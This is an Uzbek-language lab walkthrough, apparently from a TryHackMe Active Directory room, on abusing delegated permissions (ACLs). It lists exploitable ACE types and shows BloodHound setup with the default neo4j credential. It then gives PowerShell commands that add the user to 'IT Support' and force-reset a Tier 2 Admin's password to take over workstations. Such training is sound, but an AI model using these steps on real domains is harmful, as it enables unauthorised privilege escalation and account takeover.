

Active Directory **ruxsatlar va imtiyozlarni delegatsiya qilish** imkoniyatiga ega. Bu funksiyani Permission Delegation deyiladi (keyingi taskda ko‘radigan Kerberos Delegation bilan adashtirmang). Delegation AD’ni katta tashkilotlar uchun juda kuchli qiladi.

Tasavvur qiling — kompaniyada **50 000 xodim** bor. Xavfsizlik sababli Domain Admin (DA) ma’lumotlari faqat **3 kishida**. Endi shu 3 kishi barcha foydalanuvchilar parolini tiklash yoki boshqa so‘rovlarni bajarishi imkonsiz. Lekin Delegation orqali, masalan, foydalanuvchini majburiy parol almashtirish huquqini **Helpdesk jamoasiga** berish mumkin.

Nazariyada Delegation har doim **eng kam yetarli ruxsat** prinsipiga rioya qilishi kerak. Ammo katta korporatsiyalarda buni doim to‘g‘ri qilish qiyin. Shu sababli noto‘g‘ri konfiguratsiyalar paydo bo‘ladi — va hujumchi aynan shuni ekspluatatsiya qiladi.

---

## Permission Delegation

Permission Delegation ekspluatlari odatda **ACL-based attacks** deb ataladi. Active Directory’da deyarli barcha obyektlar Access Control Entries (ACE) orqali boshqariladi, ular esa Discretionary Access Control List (DACL) ichida saqlanadi.

ACE’lar foydalanuvchi, guruh yoki kompyuterning ma’lum obyektga nisbatan **nimaga ruxsati bor yoki yo‘qligini** bildiradi.

Agar ACE noto‘g‘ri sozlangan bo‘lsa — hujumchi bundan foydalanib, imtiyozlarini oshirishi mumkin.

Masalan:

Helpdesk’ga Domain Users guruhiga ForceChangePassword ruxsati berilgan bo‘lsa — bu juda xavfli. Chunki ular nafaqat oddiy xodimlar, balki **Domain Admin** foydalanuvchilarning parolini ham tiklab yuborishlari mumkin. Bu esa to‘liq privilege escalationga olib keladi.

---

## Mashhur exploitable ACE turlari

* **ForceChangePassword** — foydalanuvchi parolini bilmasdan yangilab yuborishimiz mumkin.
* **AddMembers** — o‘zimizni yoki boshqa foydalanuvchini maqsad guruhiga qo‘shish.
* **GenericAll** — obyekt ustidan to‘liq nazorat. Parolni o‘zgartirish, SPN qo‘shish, guruhga qo‘shish va h.k.
* **GenericWrite** — obyektning ba’zi maydonlarini o‘zgartirish. Masalan, scriptPath ni o‘zgartirib, login payti kod bajarilishiga sabab bo‘lish.
* **WriteOwner** — obyekt egasini o‘zgartirib, keyin o‘zimizga kengroq ruxsat berib olish.
* **WriteDACL** — yangi ACE qo‘shish, ya’ni o‘zimizga to‘liq ruxsat berish.
* **AllExtendedRights** — kengaytirilgan huquqlar, masalan ForceChangePassword.

Bularning barchasi **privilege escalation** uchun ishlatilishi mumkin.

Ekspluatatsiya qilish uchun odatda:

✅ **AD-RSAT PowerShell cmdletlari**
yoki
✅ **PowerSploit**

ishlatiladi. Qaysi biri stealtier — muhitga bog‘liq.

---

## BloodHound

Sharphound siz uchun allaqachon ishlatilgan. ZIP fayl /root/Rooms/ExploitingAD/ ichida.

Neo4j’ni ishga tushirish:

```
neo4j console start
```

Yangi terminalda BloodHoundni ishga tushiring:

```
bloodhound --no-sandbox
```

Default credential: **neo4j:neo4j**

ZIP’larni drag-and-drop qiling va graflarni tahlil qiling.

---

## Privilege Escalation misoli

Bizga tayinlangan foydalanuvchida katta ruxsatlar yo‘q — faqat THMWRK1 ga RDP kirish mumkin. Bu esa past imtiyozli sessiya.

Maqsad: **Tier 2 Admins** guruhini egallash. Bu guruh barcha workstationlarda administratordir.

BloodHound’da source — bizning foydalanuvchi
target — Tier 2 Admins qilib so‘raymiz.

Natijada qiziq yo‘l chiqadi:

* Domain Users IT Support guruhiga **AddMembers** huquqiga ega ✅
* IT Support esa Tier 2 Admins foydalanuvchilarga **ForceChangePassword** huquqiga ega ✅

Demak:

Biz → o‘zimizni IT Support guruhiga qo‘shamiz → Tier 2 Adminning parolini almashtiramiz → administrator bo‘lamiz.

---

## 1. AddMember ekspluatatsiyasi

PowerShell’da:

```
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```

Tekshirish:

```
Get-ADGroupMember -Identity "IT Support"
```

Agar ismimiz chiqsa — muvaffaqiyatli.

---

## 2. ForceChangePassword hujumi

Tier 2 Admins guruhidagi a’zolarni ko‘ramiz:

```
Get-ADGroupMember -Identity "Tier 2 Admins"
```

Biror target foydalanuvchini tanlaymiz, so‘ng:

```
$Password = ConvertTo-SecureString "Yangi.Kuchli.Parol" -AsPlainText -Force
Set-ADAccountPassword -Identity "Target.Username" -Reset -NewPassword $Password
```

Agar Access Denied chiqsa — replikatsiya hali tugamagan. 5–10 daqiqa kutish kerak.

Kerak bo‘lsa:

```
gpupdate /force
```

so‘ng disconnect → reconnect.

---

## 3. Natija

Endi THMWRK1’ga shu yangi parol bilan kirishimiz mumkin.

Va biz — **Tier 2 Administrator** bo‘ldik ✅
Delegatsiya misconfig orqali privilege escalation yakunlandi.

